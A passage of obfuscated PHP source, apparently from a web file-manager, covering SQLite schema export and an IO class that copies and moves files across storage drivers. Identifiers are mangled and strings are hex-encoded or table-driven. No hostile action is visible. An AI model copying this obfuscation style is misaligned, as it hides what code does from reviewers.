= array($Óˆ’¿æÂ[1153] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[1154], $Óˆ’¿æÂ[1155] . $·¶ƒÀµÖ . $Óˆ’¿æÂ[1156], implode($Óˆ’¿æÂ[50] . PHP_EOL, $°¦²“ÏÑ), $Óˆ’¿æÂ[973]); $©™•¯»â = implode(PHP_EOL, array_merge($ûéöèüå, $ãò”â“Â)); if ($¨œ…èí && $¨œ…èí == $Óˆ’¿æÂ[13]) { return $©™•¯»â; } $©Õàúú® = array($Óˆ’¿æÂ[834] => $•Ï€‰îË, $Óˆ’¿æÂ[13] => $©™•¯»â); return $¨œ…èí ? $©Õàúú®[$¨œ…èí] : $©Õàúú®; } public function sqlFromSqlite($é¦¨¹×ø, $Ù¬¢‚™ = '') { $¾ÏˆŸÒ¬ =& $_SERVER[¹òÍ›æş]; $æØÏ¬éŞ = $this->model()->db(); $ï‹±«õ¢ = "\x50\122\x41\107\x4d\101\x20\x54\x41\102\114\x45\x5f\111\116\x46\x4f\40\x28\x27{$é¦¨¹×ø}\x27\51"; $…Í„Å¿Õ = "\123\x45\x4c\x45\x43\x54\40\52\40\x46\x52\x4f\x4d\40\x73\161\154\151\x74\145\x5f\x6d\x61\163\x74\x65\162\40\x57\110\x45\x52\105\x20\164\142\154\137\156\x61\x6d\x65\x20\75\x20\x27{$é¦¨¹×ø}\47"; $›‚àÛ« = $æØÏ¬éŞ->query($ï‹±«õ¢); if (empty($›‚àÛ«)) { $åÊ¬Òë = array($¾ÏˆŸÒ¬[834] => $¾ÏˆŸÒ¬[12], $¾ÏˆŸÒ¬[13] => $¾ÏˆŸÒ¬[12]); return $Ù¬¢‚™ ? $åÊ¬Òë[$Ù¬¢‚™] : $åÊ¬Òë; } $ˆ¬õôŒĞ = $æØÏ¬éŞ->query($…Í„Å¿Õ); $¸º‡¼’¤ = $ôş‹ĞÊ— = array(); foreach ($ˆ¬õôŒĞ as $¨ØŞâß×) { if ($¨ØŞâß×[$¾ÏˆŸÒ¬[33]] == $¾ÏˆŸÒ¬[317]) { $¸º‡¼’¤[] = $¨ØŞâß×[$¾ÏˆŸÒ¬[1157]]; } else { $ôş‹ĞÊ—[$¨ØŞâß×[$¾ÏˆŸÒ¬[32]]] = $¨ØŞâß×[$¾ÏˆŸÒ¬[1157]]; } } $óû—İ¿µ = array_merge(array($¾ÏˆŸÒ¬[1153] . $é¦¨¹×ø . $¾ÏˆŸÒ¬[128]), $¸º‡¼’¤, array_values($ôş‹ĞÊ—)); $óû—İ¿µ = implode($¾ÏˆŸÒ¬[81] . PHP_EOL, $óû—İ¿µ) . $¾ÏˆŸÒ¬[81]; if ($Ù¬¢‚™ && $Ù¬¢‚™ == $¾ÏˆŸÒ¬[13]) { return $óû—İ¿µ; } $¸ÁÛÊ» = array(); $ş’â‘æ° = array($¾ÏˆŸÒ¬[1145] => $¾ÏˆŸÒ¬[1158], $¾ÏˆŸÒ¬[353] => $¾ÏˆŸÒ¬[1159]); $éãƒş‘’ = $¾ÏˆŸÒ¬[12]; foreach ($›‚àÛ« as $¨ØŞâß×) { if ($¨ØŞâß×[$¾ÏˆŸÒ¬[67]] == $¾ÏˆŸÒ¬[98]) { $éãƒş‘’ = $¨ØŞâß×[$¾ÏˆŸÒ¬[32]]; } $úÏ¯ÓÈı = array($¾ÏˆŸÒ¬[423] . $¨ØŞâß×[$¾ÏˆŸÒ¬[32]] . $¾ÏˆŸÒ¬[423], isset($ş’â‘æ°[$¨ØŞâß×[$¾ÏˆŸÒ¬[33]]]) ? $ş’â‘æ°[$¨ØŞâß×[$¾ÏˆŸÒ¬[33]]] : $¨ØŞâß×[$¾ÏˆŸÒ¬[33]], $¨ØŞâß×[$¾ÏˆŸÒ¬[35]] == $¾ÏˆŸÒ¬[98] ? $¾ÏˆŸÒ¬[1150] : $¾ÏˆŸÒ¬[1160] . $¨ØŞâß×[$¾ÏˆŸÒ¬[66]], $¨ØŞâß×[$¾ÏˆŸÒ¬[67]] == $¾ÏˆŸÒ¬[98] ? $¾ÏˆŸÒ¬[1161] : $¾ÏˆŸÒ¬[12]); $¸ÁÛÊ»[] = trim(implode($¾ÏˆŸÒ¬[53], $úÏ¯ÓÈı)); } foreach ($ôş‹ĞÊ— as $Ú¶§›Ë => $‡“ŸÀ¾‰) { $¬íœáè¶ = str_replace($¾ÏˆŸÒ¬[1162] . $é¦¨¹×ø . $¾ÏˆŸÒ¬[11], $¾ÏˆŸÒ¬[12], $Ú¶§›Ë); $è’É„Öó = str_replace(array($¾ÏˆŸÒ¬[128], $¾ÏˆŸÒ¬[984]), $¾ÏˆŸÒ¬[423], substr($‡“ŸÀ¾‰, stripos($‡“ŸÀ¾‰, $¾ÏˆŸÒ¬[298]))); if ($¬íœáè¶ == $¾ÏˆŸÒ¬[1139]) { $’–Çñøş = $¾ÏˆŸÒ¬[1163] . $éãƒş‘’ . $¾ÏˆŸÒ¬[1164]; } else { $’–Çñøş = (stripos($¬íœáè¶, $¾ÏˆŸÒ¬[11]) ? $¾ÏˆŸÒ¬[1165] : $¾ÏˆŸÒ¬[12]) . ($¾ÏˆŸÒ¬[1166] . $¬íœáè¶ . $¾ÏˆŸÒ¬[1167] . $è’É„Öó); } $¸ÁÛÊ»[] = $’–Çñøş; } $‚×šÜ„è = array($¾ÏˆŸÒ¬[1168] . $é¦¨¹×ø . $¾ÏˆŸÒ¬[1169], $¾ÏˆŸÒ¬[1170] . $é¦¨¹×ø . $¾ÏˆŸÒ¬[1171], implode($¾ÏˆŸÒ¬[50] . PHP_EOL, $¸ÁÛÊ»), $¾ÏˆŸÒ¬[1172]); $ø‘ŞÁ•¶ = implode(PHP_EOL, $‚×šÜ„è); if ($Ù¬¢‚™ && $Ù¬¢‚™ == $¾ÏˆŸÒ¬[834]) { return $ø‘ŞÁ•¶; } $åÊ¬Òë = array($¾ÏˆŸÒ¬[834] => $ø‘ŞÁ•¶, $¾ÏˆŸÒ¬[13] => $óû—İ¿µ); return $Ù¬¢‚™ ? $åÊ¬Òë[$Ù¬¢‚™] : $åÊ¬Òë; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ş¹ş¤¼ş, $ê„§ê²ù) { $š¨«•¬ =& $_SERVER[¹òÍ›æş]; $ëáñµğ = $ê„§ê²ù; $GLOBALS[$š¨«•¬[1173]] = $š¨«•¬[1174] . $Ş¹ş¤¼ş; Hook::trigger($š¨«•¬[1174] . $Ş¹ş¤¼ş . $š¨«•¬[1175], $ëáñµğ); $ıÆôŒ = self::driverMake($ê„§ê²ù[0]); if (!$ıÆôŒ) { return !1; } if (method_exists($ıÆôŒ, $Ş¹ş¤¼ş)) { $ŞçÚ½‰Ş = @call_user_func_array(array($ıÆôŒ, $Ş¹ş¤¼ş), $ê„§ê²ù); } else { if (method_exists($ıÆôŒ, $š¨«•¬[1176])) { $ŞçÚ½‰Ş = @call_user_func_array(array($ıÆôŒ, $Ş¹ş¤¼ş), $ê„§ê²ù); } else { if (method_exists(self, $Ş¹ş¤¼ş)) { $ŞçÚ½‰Ş = @call_user_func_array(array(self, $Ş¹ş¤¼ş), $ê„§ê²ù); } else { $ŞçÚ½‰Ş = call_user_func_array(array(parent, $Ş¹ş¤¼ş), $ê„§ê²ù); } } } Hook::trigger($š¨«•¬[1174] . $Ş¹ş¤¼ş . $š¨«•¬[1177], $ëáñµğ, $ŞçÚ½‰Ş); return $ŞçÚ½‰Ş; } public static function init($ÔöìíÉˆ) { return self::driverMake($ÔöìíÉˆ); } public static function copy($È¹ ï’Ç, $ŠÁ¸ş„­, $ÀÔ¯·¦Æ = false, $İó¼îÔ€ = false) { return self::copyMoveStart($È¹ ï’Ç, $ŠÁ¸ş„­, $ÀÔ¯·¦Æ, $_SERVER[¹òÍ›æş][584], $İó¼îÔ€); } public static function move($ºÈ¨•¡, $îªçë¯¦, $±ÙˆØË± = false, $Ë£Œ¯•ë = false) { return self::copyMoveStart($ºÈ¨•¡, $îªçë¯¦, $±ÙˆØË±, $_SERVER[¹òÍ›æş][586], $Ë£Œ¯•ë); } private static function copyMoveStart($Â¿©‡Ö‹, $ÕÂ³§©°, $£¯ÔøÍà, $³èí³Æ•, $’ùöµ¤) { $“ØûØÓè =& $_SERVER[¹òÍ›æş]; $ö¼¾½³ƒ = array($Â¿©‡Ö‹, $ÕÂ³§©°, $£¯ÔøÍà, $’ùöµ¤); Hook::trigger($“ØûØÓè[1174] . $³èí³Æ• . $“ØûØÓè[1175], $ö¼¾½³ƒ); $×ŞìÆÚ = self::copyMove($Â¿©‡Ö‹, $ÕÂ³§©°, $£¯ÔøÍà, $³èí³Æ•, $’ùöµ¤); Hook::trigger($“ØûØÓè[1174] . $³èí³Æ• . $“ØûØÓè[1177], $ö¼¾½³ƒ, $×ŞìÆÚ); return $×ŞìÆÚ; } public static function saveFile($áÌ†Í…, $é¼·ÄØÖ, $ÒĞİá£Á = true) { $áÚœäç =& $_SERVER[¹òÍ›æş]; $ïÒã„¿ = self::info($é¼·ÄØÖ); $’ ©õà = self::driverMake($áÌ†Í…); $ÓºÂï‚ = self::driverMake($é¼·ÄØÖ); $Â ÄÎî© = !1; if ($ÓºÂï‚->pathParse[$áÚœäç[1178]]) { $Â ÄÎî© = $ÓºÂï‚; $·²üú•Ø = $ÓºÂï‚->pathParse[$áÚœäç[1178]]; $ÓºÂï‚ = self::driverMake($·²üú•Ø); } if ($’ ©õà->pathParse[$áÚœäç[1178]]) { $•ä¡„á = $’ ©õà->pathParse[$áÚœäç[1178]]; $’ ©õà = self::driverMake($•ä¡„á); } $”ãëœ§“ = $ÓºÂï‚->pathFather($é¼·ÄØÖ); $¿ıò°ªÕ = !0; if (!$ÒĞİá£Á && self::driverIsSame($’ ©õà, $ÓºÂï‚)) { $¿ıò°ªÕ = !1; } $áŸ”¼Çâ = self::copyFile($’ ©õà, $áÌ†Í…, $ÓºÂï‚, $”ãëœ§“, $ïÒã„¿[$áÚœäç[32]], $¿ıò°ªÕ); if ($Â ÄÎî©) { $áŸ”¼Çâ = $Â ÄÎî©->getPathOuter($áŸ”¼Çâ); } return $áŸ”¼Çâ; } private static function copyMove($Õ¨«¤í, $¢ÏÖ¾Ù¤, $‡Ã³œßó, $óÀŒÅåÜ, $ÛÒÖÄÒ‡ = false) { $Ì«¸êª =& $_SERVER[¹òÍ›æş]; if (!$Õ¨«¤í || $Õ¨«¤í == $Ì«¸êª[8] || !$¢ÏÖ¾Ù¤) { return !1; } ignore_timeout(); $õ¢ËÀö = self::driverMake($Õ¨«¤í); $…¸†³‡à = self::driverMake($¢ÏÖ¾Ù¤); $÷ãÔãçÄ = $óÀŒÅåÜ == $Ì«¸êª[586]; $Â’îˆË¼ = !1; if ($…¸†³‡à->pathParse[$Ì«¸êª[1178]]) { $Â’îˆË¼ = $…¸†³‡à; $¢ÏÖ¾Ù¤ = $…¸†³‡à->pathParse[$Ì«¸êª[1178]]; $…¸†³‡à = self::driverMake($¢ÏÖ¾Ù¤); } if ($õ¢ËÀö->pathParse[$Ì«¸êª[1178]]) { $Õ¨«¤í = $õ¢ËÀö->pathParse[$Ì«¸êª[1178]]; $õ¢ËÀö = self::driverMake($Õ¨«¤í); } self::check($õ¢ËÀö, $Õ¨«¤í, $…¸†³‡à, $¢ÏÖ¾Ù¤); Hook::trigger($Ì«¸êª[1179], $õ¢ËÀö, $Õ¨«¤í, $…¸†³‡à, $¢ÏÖ¾Ù¤); $†Ä…¾ó“ = self::driverIsSame($õ¢ËÀö, $…¸†³‡à); if ($†Ä…¾ó“) { if ($óÀŒÅåÜ == $Ì«¸êª[586] && !method_exists($…¸†³‡à, $Ì«¸êª[1180]) && trim($¢ÏÖ¾Ù¤, $Ì«¸êª[8]) == trim($…¸†³‡à->pathFather($Õ¨«¤í), $Ì«¸êª[8])) { if ($õ¢ËÀö->pathThis($Õ¨«¤í) != $ÛÒÖÄÒ‡ && !$õ¢ËÀö->isTypeObject()) { return $õ¢ËÀö->rename($Õ¨«¤í, $ÛÒÖÄÒ‡); } return $…¸†³‡à->getPathOuter($Õ¨«¤í); } if (method_exists($…¸†³‡à, $óÀŒÅåÜ)) { return $…¸†³‡à->{$óÀŒÅåÜ}($Õ¨«¤í, $¢ÏÖ¾Ù¤, $‡Ã³œßó, $ÛÒÖÄÒ‡); } } if ($†Ä…¾ó“ && $óÀŒÅåÜ == $Ì«¸êª[586] && $…¸†³‡à->getType() == $Ì«¸êª[116]) { $ÈÄŠ¥»ˆ = $…¸†³‡à->movePath($Õ¨«¤í, $¢ÏÖ¾Ù¤, $ÛÒÖÄÒ‡); if ($ÈÄŠ¥»ˆ) { return $ÈÄŠ¥»ˆ; } } $ÌÊó–ÅÁ = $õ¢ËÀö->isFile($Õ¨«¤í); if (!$ÌÊó–ÅÁ && $…¸†³‡à->getType() == $Ì«¸êª[787] && $õ¢ËÀö->getType() == $Ì«¸êª[116]) { $ÈÄŠ¥»ˆ = $…¸†³‡à->copyFolderFromIO($õ¢ËÀö, $Õ¨«¤í, $¢ÏÖ¾Ù¤, $‡Ã³œßó, $÷ãÔãçÄ, $ÛÒÖÄÒ‡); } else { $ÈÄŠ¥»ˆ = self::copyPath($õ¢ËÀö, $Õ¨«¤í, $…¸†³‡à, $¢ÏÖ¾Ù¤, $‡Ã³œßó, $÷ãÔãçÄ, $ÌÊó–ÅÁ, $ÛÒÖÄÒ‡); } if ($ÈÄŠ¥»ˆ && $÷ãÔãçÄ) { $õ¢ËÀö->remove($Õ¨«¤í); } if ($Â’îˆË¼) { $ÈÄŠ¥»ˆ = $Â’îˆË¼->getPathOuter($ÈÄŠ¥»ˆ); } return $ÈÄŠ¥»ˆ; } private static function check($å‹¥Øò, $¿°¾®ä«, $‡û›ãğ, &$¬“·îÖ) { $ñ£®ùäø =& $_SERVER[¹òÍ›æş]; if (self::driverIsSame($å‹¥Øò, $‡û›ãğ) && $å‹¥Øò->isFolder($¿°¾®ä«) && $å‹¥Øò->isParentOf($¿°¾®ä«, $¬“·îÖ)) { show_json(LNG($ñ£®ùäø[1181]), !1); } if (!$å‹¥Øò->exist($¿°¾®ä«)) { show_json(LNG($ñ£®ùäø[115]), !1); } } private static function copyPath($¯ÉŸÅ×¯, $ĞŞ‘íÕ¾, $¬‹ªäÈİ, $´Å«æîÇ, $°–ĞÏĞ, $¸ãıà˜ú, $Æ–Şô¶‡, $Îé¥–œˆ = false, $˜›š‚Ø = true) { $µÚšÃ—— =& $_SERVER[¹òÍ›æş]; $ñ¼íà“ = empty($Îé¥–œˆ) && $Îé¥–œˆ !== $µÚšÃ——[208] ? $¯ÉŸÅ×¯->pathThis($ĞŞ‘íÕ¾) : $Îé¥–œˆ; if ($°–ĞÏĞ) { $Í­û Ğ = $¬‹ªäÈİ->fileNameExist($´Å«æîÇ, $ñ¼íà“); $ìôå–´ = $ñ¼íà“; $ñ¼íà“ = $¬‹ªäÈİ->fileNameAuto($´Å«æîÇ, $ñ¼íà“, $°–ĞÏĞ, !$Æ–Şô¶‡); if (!$Í­û Ğ || $ìôå–´ != $ñ¼íà“) { $°–ĞÏĞ = !1; } if ($˜›š‚Ø && !$°–ĞÏĞ) { $¬‹ªäÈİ->_data[$µÚšÃ——[1182]] = !0; } } if ($Æ–Şô¶‡) { return self::copyFile($¯ÉŸÅ×¯, $ĞŞ‘íÕ¾, $¬‹ªäÈİ, $´Å«æîÇ, $ñ¼íà“, $¸ãıà˜ú); } if ($°–ĞÏĞ == REPEAT_RENAME_FOLDER) { $°–ĞÏĞ = !1; } $¥¥»„ = rtrim($´Å«æîÇ, $µÚšÃ——[8]) . $µÚšÃ——[8] . $ñ¼íà“; $ ÷«ì ú = $¬‹ªäÈİ->mkdir($¬‹ªäÈİ->getPath($¥¥»„), $°–ĞÏĞ); $´Å«æîÇ = $¬‹ªäÈİ->getPathInner($ ÷«ì ú); $¿ÓÓŸœ¿ = $¯ÉŸÅ×¯->listPath($ĞŞ‘íÕ¾, !0); $¿ÓÓŸœ¿ = is_array($¿ÓÓŸœ¿) ? $¿ÓÓŸœ¿ : array($µÚšÃ——[93] => array(), $µÚšÃ——[92] => array()); $¬ƒšÑÖ = array_merge($¿ÓÓŸœ¿[$µÚšÃ——[93]], $¿ÓÓŸœ¿[$µÚšÃ——[92]]); foreach ($¬ƒšÑÖ as $Şßüí”) { $²…Ã€‹ = $Şßüí”[$µÚšÃ——[33]] == $µÚšÃ——[210]; $ĞŞ‘íÕ¾ = $¯ÉŸÅ×¯->getPathInner($Şßüí”[$µÚšÃ——[94]]); $ÊóÀ°ö³ = self::copyPath($¯ÉŸÅ×¯, $ĞŞ‘íÕ¾, $¬‹ªäÈİ, $´Å«æîÇ, $°–ĞÏĞ, $¸ãıà˜ú, $²…Ã€‹, !1, !1); if (!$ÊóÀ°ö³) { IO::errorTips($µÚšÃ——[1183] . $ĞŞ‘íÕ¾ . $µÚšÃ——[80] . $´Å«æîÇ); } } self::copyMoveKeepInfo($¯ÉŸÅ×¯, $ĞŞ‘íÕ¾, $ ÷«ì ú); return $ ÷«ì ú; } private static function copyFile($«„—¦†¸, $ğò‹Û°ä, $ÀßÀé½ß, $•«×ğÚÎ, $şÇÃæŞë, $Æ·ºàú‘) { $Ö’ĞŒæ¾ =& $_SERVER[¹òÍ›æş]; $•«×ğÚÎ = $ÀßÀé½ß->getPath(rtrim($•«×ğÚÎ, $Ö’ĞŒæ¾[8]) . $Ö’ĞŒæ¾[8] . $şÇÃæŞë); $‹ÄÀ Ò® = $Ö’ĞŒæ¾[1184] . time() . rand_string(5); Hook::trigger($Ö’ĞŒæ¾[1185], $«„—¦†¸, $ğò‹Û°ä, $ÀßÀé½ß, $•«×ğÚÎ, $şÇÃæŞë, $‹ÄÀ Ò®); if (self::driverIsSame($«„—¦†¸, $ÀßÀé½ß)) { if ($Æ·ºàú‘) { $˜Œƒçßú = $ÀßÀé½ß->moveFile($ğò‹Û°ä, $•«×ğÚÎ); } else { $˜Œƒçßú = $ÀßÀé½ß->copyFile($ğò‹Û°ä, $•«×ğÚÎ); } Hook::trigger($Ö’ĞŒæ¾[1186], $«„—¦†¸, $ğò‹Û°ä, $ÀßÀé½ß, $•«×ğÚÎ, $şÇÃæŞë, $˜Œƒçßú); self::copyMoveKeepInfo($«„—¦†¸, $ğò‹Û°ä, $˜Œƒçßú); return $˜Œƒçßú; } $øÉ™ë¬ = TEMP_FILES; if ($GLOBALS[$Ö’ĞŒæ¾[6]][$Ö’ĞŒæ¾[99]][$Ö’ĞŒæ¾[826]]) { $øÉ™ë¬ = $GLOBALS[$Ö’ĞŒæ¾[6]][$Ö’ĞŒæ¾[99]][$Ö’ĞŒæ¾[826]]; } $ŠŒ€§ŠĞ = $øÉ™ë¬; mk_dir($ŠŒ€§ŠĞ); $ş€ô³¬É = $ŠŒ€§ŠĞ . $‹ÄÀ Ò®; $Î¸‰ßì¼ = $ş€ô³¬É; $ş€ô³¬É = $«„—¦†¸->download($ğò‹Û°ä, $ş€ô³¬É); $ş€ô³¬É = $«„—¦†¸->iconvApp($ş€ô³¬É); if (substr($ş€ô³¬É, strlen($øÉ™ë¬)) == $øÉ™ë¬) { $Æ·ºàú‘ = !0; } $˜Œƒçßú = $ÀßÀé½ß->upload($•«×ğÚÎ, $ş€ô³¬É, $Æ·ºàú‘); self::remove($Î¸‰ßì¼); Hook::trigger($Ö’ĞŒæ¾[1186], $«„—¦†¸, $ğò‹Û°ä, $ÀßÀé½ß, $•«×ğÚÎ, $şÇÃæŞë, $˜Œƒçßú); self::copyMoveKeepInfo($«„—¦†¸, $ğò‹Û°ä, $˜Œƒçßú); return $˜Œƒçßú; } private static function copyMoveKeepInfo($¶´Íºä´, $˜Ù§Öóğ, $­ÑÈçÅ¬) { if (!$­ÑÈçÅ¬) { return; } $‰ù‚ÃÆ = $¶´Íºä´->info($˜Ù§Öóğ); if (!is_array($‰ù‚ÃÆ)) { return; } IO::setModifyTime($­ÑÈçÅ¬, $‰ù‚ÃÆ[$_SERVER[¹òÍ›æş][95]]); } public static function pathFather($¬ã¤ü­) { $—âŠã½è = IO::init($¬ã¤ü­); $ñ¼œ›Š² = $—âŠã½è->pathFather($—âŠã½è->path); return $—âŠã½è->getPathOuter($ñ¼œ›Š²); } public static function fileOut($Ñ¸øïŸ÷, $ÕÒÖùÆœ = false, $§èá´úÅ = false, $ ğ”©™¶ = '') { $ñ‘Ï­™ = self::driverMake($Ñ¸øïŸ÷); if ($ñ‘Ï­™->isFileOutServer()) { return $ñ‘Ï­™->fileOutServer($Ñ¸øïŸ÷, $ÕÒÖùÆœ, $§èá´úÅ, $ ğ”©™¶); } return $ñ‘Ï­™->fileOut($Ñ¸øïŸ÷, $ÕÒÖùÆœ, $§èá´úÅ, $ ğ”©™¶); } public static function fileOutImage($Úè³ë’½, $±Åøí¿ = 250) { $Ğ‚é…ù¥ = array(250, 600, 1200, 2000, 3000, 5000); for ($‹Ü…‚åÕ = 0; $‹Ü…‚åÕ < count($Ğ‚é…ù¥); $‹Ü…‚åÕ++) { if ($‹Ü…‚åÕ == 0 && $±Åøí¿ <= $Ğ‚é…ù¥[$‹Ü…‚åÕ]) { $±Åøí¿ = $Ğ‚é…ù¥[$‹Ü…‚åÕ]; break; } else { if ($±Åøí¿ > $Ğ‚é…ù¥[$‹Ü…‚åÕ - 1] && $±Åøí¿ <= $Ğ‚é…ù¥[$‹Ü…‚åÕ]) { $±Åøí¿ = $Ğ‚é…ù¥[$‹Ü…‚åÕ]; break; } else { if ($‹Ü…‚åÕ == count($Ğ‚é…ù¥) - 1 && $±Åøí¿ > $Ğ‚é…ù¥[$‹Ü…‚åÕ]) { $±Åøí¿ = $Ğ‚é…ù¥[$‹Ü…‚åÕ]; break; } } } } $ßÂè«ÚÒ = self::driverMake($Úè³ë’½); if ($ßÂè«ÚÒ->isFileOutServer()) { return $ßÂè«ÚÒ->fileOutImageServer($Úè³ë’½, $±Åøí¿); } return $ßÂè«ÚÒ->fileOutImage($Úè³ë’½, $±Åøí¿); } private static function driverIsSame($¶ºÖ¤ß•, $ª–²É˜Å) { $Û²™á¶ı =& $_SERVER[¹òÍ›æş]; $šˆëÓ¡õ = $¶ºÖ¤ß•->getType(); $Ô´œœÆÌ = $ª–²É˜Å->getType(); if ($šˆëÓ¡õ != $Ô´œœÆÌ) { return !1; } if ($šˆëÓ¡õ == $Û²™á¶ı[787]) { return !0; } if ($šˆëÓ¡õ == $Û²™á¶ı[116]) { return !0; } if ($¶ºÖ¤ß•->pathDriver == $ª–²É˜Å->pathDriver) { return !0; } return !1; } public static function copyUpdate($ø“ê©¿Ü, $«ù„ªİŞ) { $ıÊÛÓ =& $_SERVER[¹òÍ›æş]; if (!IO::exist($ø“ê©¿Ü)) { return !1; } if (!IO::exist($«ù„ªİŞ)) { IO::mkdir($«ù„ªİŞ); } $ó¢ğØ“ = array_to_keyvalue(self::listAllSimple($ø“ê©¿Ü), $ıÊÛÓ[94]); $ş²¹°ƒ = array_to_keyvalue(self::listAllSimple($«ù„ªİŞ), $ıÊÛÓ[94]); $Ü¸õ¯ù‡ = array(); $‡Ã™’š¬ = array(); foreach ($ó¢ğØ“ as $ı©•ïÔË => $üäİšÆİ) { if (isset($ş²¹°ƒ[$ı©•ïÔË])) { if ($üäİšÆİ[$ıÊÛÓ[85]] == 1) { continue; } if ($ş²¹°ƒ[$ı©•ïÔË][$ıÊÛÓ[86]] == $üäİšÆİ[$ıÊÛÓ[86]]) { continue; } } if ($üäİšÆİ[$ıÊÛÓ[85]] == 1) { $‡Ã™’š¬[] = $«ù„ªİŞ . $ıÊÛÓ[8] . trim($ı©•ïÔË, $ıÊÛÓ[8]); continue; } $ÌäØÖŸ = strstr(trim($ı©•ïÔË, $ıÊÛÓ[8]), $ıÊÛÓ[8]) ? get_path_father($ı©•ïÔË) : $ıÊÛÓ[12]; $Ü¸õ¯ù‡[] = array($ıÊÛÓ[1187] => $üäİšÆİ[$ıÊÛÓ[96]], $ıÊÛÓ[1188] => rtrim($«ù„ªİŞ, $ıÊÛÓ[8]) . $ıÊÛÓ[8] . $ÌäØÖŸ, $ıÊÛÓ[1189] => $üäİšÆİ); } $¢Ç£˜é = array($ıÊÛÓ[210] => $Ü¸õ¯ù‡, $ıÊÛÓ[85] => $‡Ã™’š¬); Hook::trigger($ıÊÛÓ[1190], $ø“ê©¿Ü, $«ù„ªİŞ, $¢Ç£˜é); foreach ($‡Ã™’š¬ as $üäİšÆİ) { IO::mkdir($üäİšÆİ); } foreach ($Ü¸õ¯ù‡ as $üäİšÆİ) { IO::copy($üäİšÆİ[$ıÊÛÓ[1187]], $üäİšÆİ[$ıÊÛÓ[1188]], REPEAT_REPLACE); } } public static function fileSubstr($•§Ôü, $ÓÓ•Šİå, $Á­ŞŒ‹ì = false) { $·³¦Àƒ =& $_SERVER[¹òÍ›æş]; $ù‡á˜Åæ = self::driverMake($•§Ôü); $ıÓôŞù— = $ù‡á˜Åæ->size($•§Ôü); $ó·êÜû¬ = $ÓÓ•Šİå; $—Î±ç˜ = $Á­ŞŒ‹ì; if ($ÓÓ•Šİå < 0) { $ÓÓ•Šİå = $ıÓôŞù— + $ÓÓ•Šİå; } if ($Á­ŞŒ‹ì === !1) { $Á­ŞŒ‹ì = $ıÓôŞù— - $ÓÓ•Šİå; } if ($ÓÓ•Šİå + $Á­ŞŒ‹ì > $ıÓôŞù—) { $Á­ŞŒ‹ì = $ıÓôŞù— - $ÓÓ•Šİå; } if (!$ıÓôŞù— && $ù‡á˜Åæ->getType() == $·³¦Àƒ[116] && !$ù‡á˜Åæ->exist($•§Ôü)) { $ş«ñ™ˆò = get_path_this($•§Ôü); $¤ıëÍİÜ = parse_url_query($ş«ñ™ˆò); if (is_array($¤ıëÍİÜ) && isset($¤ıëÍİÜ[$·³¦Àƒ[32]])) { $ş«ñ™ˆò = urldecode($¤ıëÍİÜ[$·³¦Àƒ[32]]); } throw new Exception($·³¦Àƒ[1191] . LNG($·³¦Àƒ[1192]) . $·³¦Àƒ[993] . clear_html($ş«ñ™ˆò) . $·³¦Àƒ[12]); } if ($Á­ŞŒ‹ì <= 0) { return $·³¦Àƒ[12]; } if ($ÓÓ•Šİå < 0 || $ÓÓ•Šİå >= $ıÓôŞù— || $Á­ŞŒ‹ì > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\x52\x65\x61\144\x20\x65\162\162\x6f\x72\41\x20\163\x74\x61\x72\x74\x3d{$ÓÓ•Šİå}\x3b\154\145\156\x67\x74\150\x3d{$Á­ŞŒ‹ì}\x3b\40\163\151\x7a\145\x3d{$ıÓôŞù—}\73"); } $ô‚Æ¶£  = $ù‡á˜Åæ->fileSubstr($•§Ôü, $ÓÓ•Šİå, $Á­ŞŒ‹ì); if (!$ô‚Æ¶£  && $Á­ŞŒ‹ì && isset($GLOBALS[$·³¦Àƒ[1193]])) { throw new Exception($GLOBALS[$·³¦Àƒ[1193]][$·³¦Àƒ[1194]]); } return $ô‚Æ¶£ ; } private static function driverMake(&$çÓÔÄ) { $¬‚îæÉŞ =& $_SERVER[¹òÍ›æş]; $ÂÎç¯Ö‚ = KodIO::parse($çÓÔÄ); if (!self::$driverListSystem) { $ı ­‡ø = Model($¬‚îæÉŞ[797])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ı ­‡ø, $¬‚îæÉŞ[437]); } if ($ÂÎç¯Ö‚[$¬‚îæÉŞ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÂÎç¯Ö‚[$¬‚îæÉŞ[437]]]) { return !1; } $çÓÔÄ = $ÂÎç¯Ö‚[$¬‚îæÉŞ[1195]]; $ùÅê×«Ê = self::driverGet($ÂÎç¯Ö‚, $çÓÔÄ); return $ùÅê×«Ê; } private static function driverGet($ÍÆĞÃ£, &$à–ôûîÛ) { $‡¡¶´„Ö =& $_SERVER[¹òÍ›æş]; $é¨±Œ«Á = $ÍÆĞÃ£[$‡¡¶´„Ö[1196]]; $“Ó½Ù = $ÍÆĞÃ£[$‡¡¶´„Ö[437]]; switch ($ÍÆĞÃ£[$‡¡¶´„Ö[33]]) { case KodIO::KOD_IO: $Â”ØŠ”Ë = self::$driverListSystem[$“Ó½Ù]; break; case KodIO::KOD_SOURCE: $à–ôûîÛ = $“Ó½Ù . $à–ôûîÛ; $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => $‡¡¶´„Ö[1198], $‡¡¶´„Ö[6] => $ÍÆĞÃ£); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $èíÙ = $GLOBALS[$‡¡¶´„Ö[1199]]; self::$driverListUser = array_to_keyvalue($èíÙ, $‡¡¶´„Ö[437]); } $Â”ØŠ”Ë = self::$driverListUser[$“Ó½Ù]; break; case KodIO::KOD_SHARE_LINK: $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => $‡¡¶´„Ö[1200], $‡¡¶´„Ö[6] => $ÍÆĞÃ£); $¯É¸Áëã = Action($‡¡¶´„Ö[1201])->sharePathInfo($ÍÆĞÃ£[$‡¡¶´„Ö[94]]); $à–ôûîÛ = $¯É¸Áëã[$‡¡¶´„Ö[440]]; if (!$¯É¸Áëã[$‡¡¶´„Ö[440]]) { $×¦—¹Á¨ = Model($‡¡¶´„Ö[630])->getInfo($¯É¸Áëã[$‡¡¶´„Ö[631]]); $à–ôûîÛ = KodIO::clear($×¦—¹Á¨[$‡¡¶´„Ö[1202]] . $ÍÆĞÃ£[$‡¡¶´„Ö[1195]]); $ÍÆĞÃ£[$‡¡¶´„Ö[524]] = $×¦—¹Á¨; $ÍÆĞÃ£[$‡¡¶´„Ö[1178]] = $à–ôûîÛ; $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => 